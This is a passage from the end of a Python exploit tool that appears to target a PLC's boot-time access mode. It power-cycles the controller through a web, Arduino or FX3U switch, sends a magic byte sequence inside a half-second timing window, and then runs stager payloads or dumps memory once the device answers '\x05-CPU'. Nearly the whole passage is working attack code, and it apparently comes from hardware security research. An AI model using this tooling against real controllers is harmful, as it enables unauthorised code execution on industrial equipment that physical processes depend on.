                        help='the location of the stager payload')
    parser.add_argument('-c', '--continue', dest='cont', default=False, action='store_true', help="Continue PLC execution after action completed")
    parser.add_argument('-e', '--extra', default="", dest='extra', nargs='+', help="Additional arguments for custom logic")

    subparsers = parser.add_subparsers(dest="action")
    parser_invoke_hook = subparsers.add_parser(ACTION_INVOKE_HOOK)
    parser_invoke_hook.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default=None,
                        help='The file containing the payload to be executed', required=True)
    parser_invoke_hook.add_argument('-a', '--args', default=[], dest='args', nargs='+', help="Additional arguments to be passed to payload invocation") # Default empty list

    parser_dump = subparsers.add_parser(ACTION_DUMP)
    parser_dump.add_argument('-a', '--address', dest="address", type=lambda x: int(x, 0), help="Address to dump at", required=True)
    parser_dump.add_argument('-l', '--length', dest="length", type=lambda x: int(x, 0), help="Number of bytes to dump", required=True)
    parser_dump.add_argument('-d', '--dump-payload', dest='payload', type=argparse.FileType('rb'), default=DUMPMEM_PL_FILENAME)
    parser_dump.add_argument('-o', '--out-file', dest='outfile', default=None, help="Name of file to store the dump at")



    parser_test = subparsers.add_parser(ACTION_TEST)
    # Default is a .bin file, should be 'rb'
    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/hello_world/hello_world.bin",
                        help='The file containing the payload to be executed, defaults to payloads/hello_world/hello_world.bin')

    # Create a separate parser instance for ACTION_HELLO_LOOP for clarity, as it was overwriting parser_test before
    parser_hello_loop = subparsers.add_parser(ACTION_HELLO_LOOP)
    # Default is a .bin file, should be 'rb'
    parser_hello_loop.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/hello_loop/build/hello_loop.bin",
                        help='The file containing the payload to be executed, defaults to payloads/hello_loop/build/hello_loop.bin')
    
    # Create a separate parser instance for ACTION_TIC_TAC_TOE
    parser_tic_tac_toe = subparsers.add_parser(ACTION_TIC_TAC_TOE)
    # Default is a .bin file, should be 'rb'
    parser_tic_tac_toe.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin",
                        help='The file containing the payload to be executed, defaults to payloads/tic_tac_toe/build/tic_tac_toe.bin')

 

    args = parser.parse_args()

    # Conditional requirement for --powersupply-arduino-port
    if args.powersupply_method == 'arduino' and not args.powersupply_arduino_port:
        parser.error("--powersupply-arduino-port is required when --powersupply-method is arduino")

    # Conditional requirement for FX3U arguments handled within the `if args.switch_power:` block below.

    # We are currently using pwntools for the connection as those
    # proved to be reliable. We may want to refactor this.
    s = remote("localhost", args.port)

    if args.switch_power:
        print("Turning off power supply using method '{}' and sleeping for {:d} seconds".format(args.powersupply_method, args.powersupply_delay))

        # switch_power.py is now python3. Commands are lists of strings, this is fine.
        base_cmd_off = ["tools/powersupply/switch_power.py"]
        base_cmd_on = ["tools/powersupply/switch_power.py"]

        if args.powersupply_method == 'web':
            web_args = ["--host", args.powersupply_host, "--port", str(args.powersupply_port)]
            base_cmd_off.extend(web_args)
            base_cmd_on.extend(web_args)
        elif args.powersupply_method == 'arduino':
            arduino_args = ["--method", "arduino", "--arduino-port", args.powersupply_arduino_port, "--baud-rate", str(args.powersupply_baud_rate)]
            base_cmd_off.extend(arduino_args)
            base_cmd_on.extend(arduino_args)
        elif args.powersupply_method == 'fx3u':
            if not args.powersupply_fx3u_ip or not args.powersupply_fx3u_output:
                parser.error("error: --powersupply-fx3u-ip and --powersupply-fx3u-output are required when --powersupply-method is fx3u")
            fx3u_args = ["--method", "fx3u",
                         "--fx3u-ip", args.powersupply_fx3u_ip,
                         "--fx3u-output", args.powersupply_fx3u_output]
            if args.powersupply_fx3u_port is not None:
                fx3u_args.extend(["--fx3u-port", str(args.powersupply_fx3u_port)])
            base_cmd_off.extend(fx3u_args)
            base_cmd_on.extend(fx3u_args)

        cmd_off = base_cmd_off + ["off"]
        cmd_on = base_cmd_on + ["on"]

        subprocess.check_call(cmd_off)
        print("[+] Turned off power supply, sleeping")
        time.sleep(args.powersupply_delay)
        print("[+] Turned on power supply again")
        subprocess.check_call(cmd_on)
        print("[+] Successfully turned on power supply")


    print("Looping now")
    for i in range(100):
        # while True:
        # We have 500000 microseconds (half a second) to hit the timing
        s.send(pad + magic) # pad and magic are bytes

        answ = s.recv(256, timeout=0.3) # answ is bytes
        if len(answ) > 0:
            # "\5-CPU" should be b"\5-CPU"
            if not answ.startswith(b"\x05-CPU"):
                answ += s.recv(256)
            assert(answ.startswith(b"\x05-CPU")) # Check against bytes
            s.unrecv(answ) # answ is bytes, unrecv should handle it

            handle_conn(s, args.action, args)
            break

    print("Done.")


if __name__ == "__main__":
    main()

